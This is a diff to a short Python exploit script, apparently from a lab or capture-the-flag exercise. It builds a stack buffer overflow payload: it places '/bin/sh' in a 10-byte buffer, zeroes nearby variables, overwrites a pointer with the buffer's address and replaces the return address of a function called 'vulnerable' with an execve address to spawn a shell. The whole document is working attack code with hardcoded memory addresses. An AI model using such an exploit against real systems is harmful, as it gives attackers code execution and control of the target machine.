@@ -5,12 +5,22 @@ from struct import pack
 
 bin_sh_str = b"/bin/sh\x00"
 
+print(len(bin_sh_str))
+
+#this will fill the buffer of size 10
 sys.stdout.buffer.write(b"\x00\x00")
 sys.stdout.buffer.write(bin_sh_str)
+#overwrite c with 0
+sys.stdout.buffer.write(b"\x00")
 
-sys.stdout.buffer.write(b"AAAAAAAA")
-sys.stdout.buffer.write(b"BBBBBBBB")
-sys.stdout.buffer.write(b"BBBBBBBB")
-sys.stdout.buffer.write(0x00007ffffff6d160.to_bytes(8, 'little'))
-sys.stdout.buffer.write(0x0000000000401ee2.to_bytes(8, 'little'))
+#overwrite b with 0
+sys.stdout.buffer.write(b"\x00")
+
+#overwrite a with the address of the start of the buffer
+sys.stdout.buffer.write(0x7ffffff6d15e.to_bytes(8, 'little'))
+
+#padding of 1
+sys.stdout.buffer.write(b"\x00")
+
+#overwrite the return address of vulnerable with the address of execev
 sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
